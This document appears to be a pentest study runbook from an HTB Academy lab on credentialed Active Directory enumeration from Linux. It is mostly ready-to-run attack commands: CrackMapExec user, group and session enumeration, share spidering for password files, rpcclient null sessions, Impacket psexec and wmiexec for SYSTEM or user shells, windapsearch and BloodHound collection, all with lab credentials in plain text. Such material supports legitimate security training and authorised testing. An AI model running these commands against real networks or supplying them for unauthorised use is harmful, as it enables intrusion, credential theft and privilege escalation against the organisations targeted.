## Credentialed Enumeration from Linux – Quick Runbook

### 0. Prereqs

* You have **valid domain creds** (user/pass or hash), e.g.:

  * `forend / Klmcargo2`
* You know the **DC IP** and **domain name**, e.g.:

  * DC: `172.16.5.5`
  * Domain: `INLANEFREIGHT.LOCAL` / `inlanefreight.local`

---

## 1️⃣ CrackMapExec (CME / NetExec) – Fast AD Recon

**General pattern (SMB):**

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' [options]
```

### a) Enumerate domain users (with badPwdCount)

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' --users
```

* Shows `DOMAIN\user  badpwdcount: X baddpwdtime: ...`
* Use this to **avoid locking accounts** during future sprays.

### b) Enumerate domain groups

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' --groups
```

* Look for juicy groups: `Domain Admins`, `Executives`, `IT`, `SQL Servers`, etc.

### c) See who’s logged on to a host

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p 'Klmcargo2' --loggedon-users
```

* Good for **session hunting** (admins, service accounts).
* `(Pwn3d!)` indicates your user is **local admin** on that box.

### d) Enumerate shares

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' --shares
```

* Note shares with `READ` or `WRITE`:
  `Department Shares`, `User Shares`, `ZZZ_archive`, etc.

### e) Spider shares for interesting files

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p 'Klmcargo2' \
  -M spider_plus --share 'Department Shares'
```

* Results saved to: `/tmp/cme_spider_plus/<DC_IP>.json`
* Hunt for `web.config`, `*.ps1`, `*.bat`, `password`, `creds`, etc.

---

## 2️⃣ SMBMap – Share & File-Level Recon

### a) Check share access

```bash
smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

* Quickly shows what shares you can `READ` or `WRITE`.

### b) Recursively list directories (no files)

```bash
smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL \
  -H 172.16.5.5 -R 'Department Shares' --dir-only
```

* Shows `Accounting`, `Executives`, `IT`, `HR`, etc.

*(You can drop `--dir-only` to see actual files.)*

---

## 3️⃣ rpcclient – Old School but Powerful

### a) Anonymous / NULL session (if allowed)

```bash
rpcclient -U "" -N 172.16.5.5
```

Prompt becomes `rpcclient $>`.

### b) List users and their RIDs

```text
rpcclient $> enumdomusers
```

* Output: `user:[username] rid:[0xRID]`

### c) Query a specific user by RID

```text
rpcclient $> queryuser 0x457
```

* Shows `User Name`, `Full Name`, password times, `bad_password_count`, etc.

📝 **RID note:**

* Domain SID: `S-1-5-21-...`
* Full SID = `Domain SID + RID`
* `0x1f4` (500) = built-in Administrator.

---

## 4️⃣ Impacket – Remote Command & Shell

Assume creds: `inlanefreight.local/wley:'transporter@4'`.

### a) psexec.py – SYSTEM shell over SMB

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

* Drops a service, gives **`NT AUTHORITY\SYSTEM`** cmd shell.
* Great for **full control** of the box.

### b) wmiexec.py – “Fileless” semi-interactive shell

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

* Runs commands via WMI.
* Runs as the **user** (e.g., `wley`) instead of SYSTEM.
* A bit stealthier, still noisy in logs (new `cmd.exe` processes).

---

## 5️⃣ Windapsearch – LDAP Enumeration

From `/opt/windapsearch/`:

### a) Enumerate Domain Admins

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 \
  -u forend@inlanefreight.local -p 'Klmcargo2' --da
```

* Lists all **Domain Admins** (e.g., `administrator`, `lab_adm`, `mmorgan`, etc.).

### b) Enumerate all privileged users (nested)

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 \
  -u forend@inlanefreight.local -p 'Klmcargo2' -PU
```

* Finds users with **effective elevated rights** via nested groups
  (Domain Admins, Enterprise Admins, etc.).

---

## 6️⃣ BloodHound.py – Build the AD Attack Graph

### a) Collect data from Linux

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' \
  -ns 172.16.5.5 -d inlanefreight.local -c all
```

* Creates JSON files:

  * `*_computers.json`
  * `*_users.json`
  * `*_groups.json`
  * `*_domains.json`

Optional: zip them:

```bash
zip -r ilfreight_bh.zip *.json
```

### b) Load into BloodHound GUI

1. Start Neo4j:

   ```bash
   sudo neo4j start
   ```
2. Run GUI:

   ```bash
   bloodhound
   ```
3. Log in (if needed): `neo4j / HTB_@cademy_stdnt!`
4. Click **Upload Data** → select `ilfreight_bh.zip`.

### c) Use built-in queries

* Examples from **Analysis** tab:

  * *Find Shortest Paths to Domain Admins*
  * *Find All Domain Admins*
  * *Users with Local Admin Rights*

Use this to plan **realistic escalation paths**.

---

